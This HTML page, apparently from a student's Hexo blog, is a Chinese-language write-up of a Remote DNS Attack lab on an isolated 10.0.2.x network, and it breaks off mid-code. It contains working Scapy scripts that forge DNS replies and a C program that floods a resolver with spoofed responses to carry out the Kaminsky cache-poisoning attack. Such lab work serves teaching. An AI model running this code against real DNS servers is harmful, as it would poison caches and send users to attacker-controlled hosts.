@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Remote DNS Attack lab - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-11-16 16:19">
+      2020年11月16日 下午
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      30
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <h1 id="Remote-DNS-Attack"><a href="#Remote-DNS-Attack" class="headerlink" title="Remote DNS Attack"></a>Remote DNS Attack</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ul>
+<li><p>在这个实验中更加专注于DNS缓存中毒攻击，而相比于之前的local DNS Attack（攻击者和受害者DNS服务器在一个子网上面），这个实验不允许进行数据包的嗅探</p>
+</li>
+<li><p><img src="/2020/11/16/Remote-DNS-Attack-lab/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p>
+</li>
+<li><p>其次，对应的主机设置</p>
+<ul>
+<li><p><strong>用户主机（10.0.2.4）</strong></p>
+<p>  <img src="/2020/11/16/Remote-DNS-Attack-lab/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p>
+</li>
+<li><p><strong>DNS Server（10.0.2.5）</strong></p>
+<p>  <img src="/2020/11/16/Remote-DNS-Attack-lab/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p>
+</li>
+<li><p><strong>Attacker（10.0.2.7）</strong></p>
+<p>  <img src="/2020/11/16/Remote-DNS-Attack-lab/1-4.PNG" srcset="/img/loading.gif" alt="1-4"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Setup-Task"><a href="#Setup-Task" class="headerlink" title="Setup Task"></a>Setup Task</h2><h3 id="task-1：配置用户虚拟机"><a href="#task-1：配置用户虚拟机" class="headerlink" title="task 1：配置用户虚拟机"></a>task 1：配置用户虚拟机</h3><p>当配置完成之后，运行dig <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/1-5.PNG" srcset="/img/loading.gif" alt="1-5"></p>
+<p>可以看到当10.0.2.5的DNS缓存有相应条目的时候，会返回给用户主机，所以本地DNS服务器是10.0.2.5，配置正确</p>
+<h3 id="task-2：配置本地DNS服务器"><a href="#task-2：配置本地DNS服务器" class="headerlink" title="task 2：配置本地DNS服务器"></a>task 2：配置本地DNS服务器</h3><p>修改对应的/etc/bind/named.conf</p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p>
+<p>对应的/etc/bind/named.cong.options</p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p>
+<h3 id="task-3：配置攻击者主机"><a href="#task-3：配置攻击者主机" class="headerlink" title="task 3：配置攻击者主机"></a>task 3：配置攻击者主机</h3><p><img src="/2020/11/16/Remote-DNS-Attack-lab/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p>
+<h3 id="task-4：测试配置"><a href="#task-4：测试配置" class="headerlink" title="task 4：测试配置"></a>task 4：测试配置</h3><h4 id="step-1：获取ns-attacker32-com的IP地址"><a href="#step-1：获取ns-attacker32-com的IP地址" class="headerlink" title="step 1：获取ns.attacker32.com的IP地址"></a>step 1：获取ns.attacker32.com的IP地址</h4><p>输入下面命令，会得到相应的运行结果</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">dig</span> <span class="hljs-selector-tag">ns</span><span class="hljs-selector-class">.attacker32</span><span class="hljs-selector-class">.com</span></code></pre>
+
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p>
+<p>通过task3的文件内容可以知道对应的IP地址就是10.0.2.9，正确</p>
+<h4 id="step-2：获取www-example-com的IP地址"><a href="#step-2：获取www-example-com的IP地址" class="headerlink" title="step 2：获取www.example.com的IP地址"></a>step 2：获取<a href="http://www.example.com的IP地址" target="_blank" rel="noopener">www.example.com的IP地址</a></h4><ul>
+<li>首先是把DNS查询记录发向官方的nameserver</li>
+</ul>
+<pre><code class="hljs css"><span class="hljs-selector-tag">dig</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span></code></pre>
+
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/4-2.PNG" srcset="/img/loading.gif" alt="4-2"></p>
+<ul>
+<li>之后是将DNS query发往ns.attacker32.com服务器</li>
+</ul>
+<pre><code class="hljs stylus">dig @ns<span class="hljs-selector-class">.attacker32</span><span class="hljs-selector-class">.com</span> www<span class="hljs-selector-class">.example</span>.com</code></pre>
+
+<p>由于此时ns.attacker32.com对应的IP地址是10.0.2.9，按理来说需要向这台命名服务器来进行进一步的询问，但是10.0.2.9是unreachable的</p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/4-3.PNG" srcset="/img/loading.gif" alt="4-3"></p>
+<h2 id="The-Attack-Tasks"><a href="#The-Attack-Tasks" class="headerlink" title="The Attack Tasks"></a>The Attack Tasks</h2><ul>
+<li><strong>原理：</strong>是在进行DNS查询的时候进行攻击，正常情况下，当user访问<a href="http://www.example.com的时候，会到本地DNS服务器进行查询，而当本地DNS服务器不具备对应条目的时候，会从根服务器开始进行迭代查询，而我们所需要做的就是将虚假的条目插入到本地DNS服务器当中，让他访问一个虚假的/恶意的主机" target="_blank" rel="noopener">www.example.com的时候，会到本地DNS服务器进行查询，而当本地DNS服务器不具备对应条目的时候，会从根服务器开始进行迭代查询，而我们所需要做的就是将虚假的条目插入到本地DNS服务器当中，让他访问一个虚假的/恶意的主机</a></li>
+</ul>
+<h3 id="Kaminsky-attack"><a href="#Kaminsky-attack" class="headerlink" title="Kaminsky attack"></a>Kaminsky attack</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>attacker向user的本地DNS服务器发送一个请求，不攻击的情况下是</p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/5-1.PNG" srcset="/img/loading.gif" alt="5-1"></p>
+<p>而当我们在（2）进行完之后让attacker向DNS服务器发送spoofed的DNS回应的时候就可以进行注入</p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/5-2.PNG" srcset="/img/loading.gif" alt="5-2"></p>
+<h4 id="task-4：构建DNS请求报文"><a href="#task-4：构建DNS请求报文" class="headerlink" title="task 4：构建DNS请求报文"></a>task 4：构建DNS请求报文</h4><p>首先先通过python来查看DNS报文格式以及查询报文格式</p>
+<pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>ls(DNS)
+length     : ShortField (Cond)                   = (<span class="hljs-literal">None</span>)
+id         : ShortField                          = (<span class="hljs-number">0</span>)
+qr         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)
+opcode     : BitEnumField  (<span class="hljs-number">4</span> bits)              = (<span class="hljs-number">0</span>)
+aa         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)
+tc         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)
+rd         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">1</span>)
+ra         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)
+z          : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)
+ad         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)
+cd         : BitField  (<span class="hljs-number">1</span> bit)                   = (<span class="hljs-number">0</span>)
+rcode      : BitEnumField  (<span class="hljs-number">4</span> bits)              = (<span class="hljs-number">0</span>)
+qdcount    : DNSRRCountField                     = (<span class="hljs-literal">None</span>)
+ancount    : DNSRRCountField                     = (<span class="hljs-literal">None</span>)
+nscount    : DNSRRCountField                     = (<span class="hljs-literal">None</span>)
+arcount    : DNSRRCountField                     = (<span class="hljs-literal">None</span>)
+qd         : DNSQRField                          = (<span class="hljs-literal">None</span>)
+an         : DNSRRField                          = (<span class="hljs-literal">None</span>)
+ns         : DNSRRField                          = (<span class="hljs-literal">None</span>)
+ar         : DNSRRField                          = (<span class="hljs-literal">None</span>)
+<span class="hljs-meta">&gt;&gt;&gt; </span>ls(DNSQR)
+qname      : DNSStrField                         = (<span class="hljs-string">b'www.example.com'</span>)
+qtype      : ShortEnumField                      = (<span class="hljs-number">1</span>)
+qclass     : ShortEnumField                      = (<span class="hljs-number">1</span>)</code></pre>
+
+<ul>
+<li><strong>具体代码如下</strong></li>
+</ul>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *
+
+Qdsec = DNSQR(qname =<span class="hljs-string">'www.example.com'</span>)
+dns = DNS(id=<span class="hljs-number">0xAAAA</span>, qr=<span class="hljs-number">0</span>, qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">0</span>, nscount=<span class="hljs-number">0</span>,
+arcount=<span class="hljs-number">0</span>, qd=Qdsec)
+
+ip = IP(dst=<span class="hljs-string">'10.0.2.5'</span>, src=<span class="hljs-string">'10.0.2.7'</span>)
+udp = UDP(dport=<span class="hljs-number">53</span>, sport=<span class="hljs-number">33333</span>, chksum=<span class="hljs-number">0</span>)
+request = ip/udp/dns
+send(request)</code></pre>
+
+<p>之后在wireshark上面可以抓到对应的response的包，能够看到<strong>真正的<a href="http://www.example.com的IP地址（93.184.216.34）" target="_blank" rel="noopener">www.example.com的IP地址（93.184.216.34）</a></strong>，可见是DNS服务器进行了从根目录开始的查询</p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/5-3.PNG" srcset="/img/loading.gif" alt="5-3"></p>
+<p>之后将DNS缓存进行转存</p>
+<pre><code class="hljs gradle">sudo rndc dumpdb -cache
+sudo cat <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/bind/</span><span class="hljs-keyword">dump</span>.db</code></pre>
+
+<p>可看到对应条目已经在DNS缓存当中</p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/5-4.PNG" srcset="/img/loading.gif" alt="5-4"></p>
+<h4 id="task-5：欺骗DNS-reply"><a href="#task-5：欺骗DNS-reply" class="headerlink" title="task 5：欺骗DNS reply"></a>task 5：欺骗DNS reply</h4><p>具体code</p>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *
+
+name = <span class="hljs-string">'www.example.com'</span>       <span class="hljs-comment">#对应的查询报文端中的hostname</span>
+domain = <span class="hljs-string">'example.com'</span>         <span class="hljs-comment">#上面name所属的域名</span>
+ns = <span class="hljs-string">'ns.attacker32.com'</span>       <span class="hljs-comment">#这个域名的nameserver</span>
+Qdsec = DNSQR(qname=name)  
+Anssec = DNSRR(rrname=name, type=<span class="hljs-string">'A'</span>, rdata=<span class="hljs-string">'1.2.3.4'</span>, ttl=<span class="hljs-number">259200</span>)
+NSsec = DNSRR(rrname=domain, type=<span class="hljs-string">'NS'</span>, rdata=ns, ttl=<span class="hljs-number">259200</span>)
+dns = DNS(id=<span class="hljs-number">0xAAAA</span>, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>, qdcount=<span class="hljs-number">1</span>,
+          ancount=<span class="hljs-number">1</span>, nscount=<span class="hljs-number">1</span>, arcount=<span class="hljs-number">0</span>,
+          qd=Qdsec, an=Anssec, ns=NSsec)
+ip = IP(dst=<span class="hljs-string">'10.0.2.5'</span>, src=<span class="hljs-string">'199.43.135.53'</span>)      <span class="hljs-comment">#10.0.2.5是本地DNS服务器的地址，而199.43.135.53是example.com域的权威服务器的IP地址</span>
+udp = UDP(dport=<span class="hljs-number">33333</span>, sport=<span class="hljs-number">53</span>, chksum=<span class="hljs-number">0</span>)
+reply = ip/udp/dns
+send(reply)</code></pre>
+
+<p>运行后进行wireshark抓包</p>
+<p><img src="/2020/11/16/Remote-DNS-Attack-lab/5-5.png" srcset="/img/loading.gif" alt="5-5"></p>
+<p>可以看到对应的<a href="http://www.example.com的IP地址已经变为了1.2.3.4" target="_blank" rel="noopener">www.example.com的IP地址已经变为了1.2.3.4</a></p>
+<p><strong>但是此时将对应的DNS缓存打印出来，会发现并没有对应条目，猜测是只有在本地DNS服务器向外发送DNS query之后，如果收到了匹配的DNS response，才会存储在DNS缓存中</strong></p>
+<h4 id="task-6：发动kaminsky-attack"><a href="#task-6：发动kaminsky-attack" class="headerlink" title="task 6：发动kaminsky attack"></a>task 6：发动kaminsky attack</h4><p>具体code如下</p>
+<ul>
+<li>首先是负责构造reply报文格式的py文件</li>
+</ul>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *
+<span class="hljs-comment"># Construct the DNS header and payload</span>
+name = <span class="hljs-string">'zzzzz.example.com'</span>
+domain = <span class="hljs-string">'example.com'</span>
+ns = <span class="hljs-string">'ns.attacker32.com'</span>
+
+Qdsec = DNSQR(qname=name)
+Anssec = DNSRR(rrname=name, type=<span class="hljs-string">'A'</span>, rdata=<span class="hljs-string">'1.1.2.2'</span>, ttl=<span class="hljs-number">259200</span>)
+NSsec = DNSRR(rrname = domain, type = <span class="hljs-string">'NS'</span>, rdata = ns, ttl = <span class="hljs-number">259200</span>)
+Addsec = DNSRR(rrname = ns, type = <span class="hljs-string">'A'</span>, rdata = <span class="hljs-string">'10.0.2.7'</span>,ttl = <span class="hljs-number">259200</span>)
+dns = DNS(id=<span class="hljs-number">0xAAAA</span>, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>,
+qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, nscount=<span class="hljs-number">1</span>, arcount=<span class="hljs-number">1</span>,
+qd=Qdsec, an=Anssec, ns = NSsec, ar = Addsec)
+<span class="hljs-comment"># Construct the IP, UDP headers, and the entire packet</span>
+ip = IP(dst=<span class="hljs-string">'10.0.2.5'</span>, src=<span class="hljs-string">'199.43.135.53'</span>, chksum=<span class="hljs-number">0</span>)
+udp = UDP(dport=<span class="hljs-number">33333</span>, sport=<span class="hljs-number">53</span>, chksum=<span class="hljs-number">0</span>)
+pkt = ip/udp/dns
+<span class="hljs-comment"># Save the packet to a file</span>
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'ip_resp.bin'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
+    f.write(bytes(pkt))</code></pre>
+
+<ul>
+<li>其次是构造request报文格式的py文件</li>
+</ul>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *
+
+ip = IP(dst = <span class="hljs-string">'10.0.2.5'</span>)
+udp = UDP(dport = <span class="hljs-number">53</span>, chksum = <span class="hljs-number">0</span>)
+
+name = <span class="hljs-string">'zzzzz.example.com'</span>
+Qdsec = DNSQR(qname=name)
+dns = DNS(id=<span class="hljs-number">0x100</span>, qr=<span class="hljs-number">0</span>, qdcount=<span class="hljs-number">1</span>, qd=Qdsec)
+query = ip/udp/dns
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'ip_req.bin'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
+    f.write(bytes(query))</code></pre>
+
+<ul>
+<li>最后是进行发送以及欺骗的c文件</li>
+</ul>
+<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_FILE_SIZE 1000000</span>
+
+
+<span class="hljs-comment">/* IP Header */</span>
+<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> &#123;</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>      iph_ihl:<span class="hljs-number">4</span>, <span class="hljs-comment">//IP header length</span>
+                     iph_ver:<span class="hljs-number">4</span>; <span class="hljs-comment">//IP version</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>      iph_tos; <span class="hljs-comment">//Type of service</span>
+    <span class="hljs-keyword">unsigned</span> short <span class="hljs-keyword">int</span> iph_len; <span class="hljs-comment">//IP Packet length (data + header)</span>
+    <span class="hljs-keyword">unsigned</span> short <span class="hljs-keyword">int</span> iph_ident; <span class="hljs-comment">//Identification</span>
+    <span class="hljs-keyword">unsigned</span> short <span class="hljs-keyword">int</span> iph_flag:<span class="hljs-number">3</span>, <span class="hljs-comment">//Fragmentation flags</span>
+                     iph_offset:<span class="hljs-number">13</span>; <span class="hljs-comment">//Flags offset</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>      iph_ttl; <span class="hljs-comment">//Time to Live</span>
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>      iph_protocol; <span class="hljs-comment">//Protocol type</span>
+    <span class="hljs-keyword">unsigned</span> short <span class="hljs-keyword">int</span> iph_chksum; <span class="hljs-comment">//IP datagram checksum</span>
+    <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_sourceip</span>;</span> <span class="hljs-comment">//Source IP address </span>
+    <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_destip</span>;</span>   <span class="hljs-comment">//Destination IP address </span>
+&#125;;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_raw_packet</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * <span class="hljs-built_in">buffer</span>, <span class="hljs-keyword">int</span> pkt_size)</span></span>;
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_dns_request</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ip_req, <span class="hljs-keyword">int</span> n)</span></span>;
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_dns_response</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ip_resp, <span class="hljs-keyword">int</span> n)</span></span>;
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">long</span> i = <span class="hljs-number">0</span>;
+
+    srand(time(<span class="hljs-literal">NULL</span>));
+		
+    <span class="hljs-comment">// Load the DNS request packet from file</span>
+    FILE * f_req = fopen(<span class="hljs-string">"ip_req.bin"</span>, <span class="hljs-string">"rb"</span>);
+    <span class="hljs-keyword">if</span> (!f_req) &#123;
+        perror(<span class="hljs-string">"Can't open 'ip_req.bin'"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    &#125;
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> ip_req[MAX_FILE_SIZE];
+    <span class="hljs-keyword">int</span> n_req = fread(ip_req, <span class="hljs-number">1</span>, MAX_FILE_SIZE, f_req);
+
+    <span class="hljs-comment">// Load the first DNS response packet from file</span>
+    FILE * f_resp = fopen(<span class="hljs-string">"ip_resp.bin"</span>, <span class="hljs-string">"rb"</span>);
+    <span class="hljs-keyword">if</span> (!f_resp) &#123;
+        perror(<span class="hljs-string">"Can't open 'ip_resp.bin'"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    &#125;
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> ip_resp[MAX_FILE_SIZE];
+    <span class="hljs-keyword">int</span> n_resp = fread(ip_resp, <span class="hljs-number">1</span>, MAX_FILE_SIZE, f_resp);
+
+    <span class="hljs-keyword">char</span> a[<span class="hljs-number">26</span>]=<span class="hljs-string">"abcdefghijklmnopqrstuvwxyz"</span>;
+    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;
+        <span class="hljs-keyword">unsigned</span> short transaction_id = <span class="hljs-number">0</span>;
+
+        <span class="hljs-comment">// Generate a random name with length 5</span>
+        <span class="hljs-keyword">char</span> name[<span class="hljs-number">5</span>];
+        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k=<span class="hljs-number">0</span>; k&lt;<span class="hljs-number">5</span>; k++)  
+            name[k] = a[rand() % <span class="hljs-number">26</span>];
+
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"attempt #%ld. request is [%s.example.com], transaction ID is: [%hu]\n"</span>, 
+             ++i, name, transaction_id);
+
+
+        <span class="hljs-comment">//##################################################################</span>
+        <span class="hljs-comment">/* Step 1. Send a DNS request to the targeted local DNS server</span>
+<span class="hljs-comment">              This will trigger it to send out DNS queries */</span>
+
+        <span class="hljs-comment">// ... Students should add code here.</span>
+		<span class="hljs-built_in">memcpy</span>(ip_req+<span class="hljs-number">41</span>, name, <span class="hljs-number">5</span>);
+        send_dns_request(ip_req, n_req);
+
+        <span class="hljs-comment">// Step 2. Send spoofed responses to the targeted local DNS server.</span>
+    
+        <span class="hljs-comment">// ... Students should add code here.</span>
+        <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">41</span>, name, <span class="hljs-number">5</span>);
+        <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">64</span>, name, <span class="hljs-number">5</span>);
+        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">5000</span> ; i++)
+        &#123;
+            <span class="hljs-keyword">unsigned</span> short id =rand();
+            <span class="hljs-keyword">unsigned</span> short id_net_order = htons(id);
+            <span class="hljs-built_in">memcpy</span>(ip_resp+<span class="hljs-number">28</span>, &amp;id_net_order, <span class="hljs-number">2</span>);
+            send_dns_response(ip_resp, n_resp);
+        &#125; 
+        <span class="hljs-comment">//##################################################################</span>
+    &#125;
+&#125;
+
+
+<span class="hljs-comment">/* Use for sending DNS request.</span>
+<span class="hljs-comment"> * Add arguments to the function definition if needed.</span>
+<span class="hljs-comment"> * */</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_dns_request</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ip_req, <span class="hljs-keyword">int</span> n)</span></span>
+<span class="hljs-function"></span>&#123;
+  <span class="hljs-comment">// Students need to implement this function</span>
+    send_raw_packet(ip_req, n);
+&#125;
+
+
+<span class="hljs-comment">/* Use for sending forged DNS response.</span>
+<span class="hljs-comment"> * Add arguments to the function definition if needed.</span>
+<span class="hljs-comment"> * */</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_dns_response</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ip_resp, <span class="hljs-keyword">int</span> n)</span></span>
+<span class="hljs-function"></span>&#123;
+  <span class="hljs-comment">// Students need to implement this function</span>
+    send_raw_packet(ip_resp, n);
+&#125;
+
+
+<span class="hljs-comment">/* Send the raw packet out </span>
+<span class="hljs-comment"> *    buffer: to contain the entire IP packet, with everything filled out.</span>
+<span class="hljs-comment"> *    pkt_size: the size of the buffer.</span>
+<span class="hljs-comment"> * */</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send_raw_packet</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * <span class="hljs-built_in">buffer</span>, <span class="hljs-keyword">int</span> pkt_size)</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">dest_info</span>;</span>
+    <span class="hljs-keyword">int</span> enable = <span class="hljs-number">1</span>;
+
+    <span class="hljs-comment">// Step 1: Create a raw network socket.</span>
+    <span class="hljs-keyword">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+    <span class="hljs-comment">// Step 2: Set socket option.</span>
+    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
+	     &amp;enable, <span class="hljs-keyword">sizeof</span>(enable));
+
+    <span class="hljs-comment">// Step 3: Provide needed information about destination.</span>
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> *<span class="hljs-title">ip</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">ipheader</span> *) <span class="hljs-title">buffer</span>;</span>
+    dest_info.sin_family = AF_INET;
+    dest_info.sin_addr = ip-&gt;iph_destip;
+
+    <span class="hljs-comment">// Step 4: Send the packet out.</span>
+    sendto(sock, <span class="hljs-built_in">buffer</span>, pkt_size, <span class="hljs-number">0</span>,
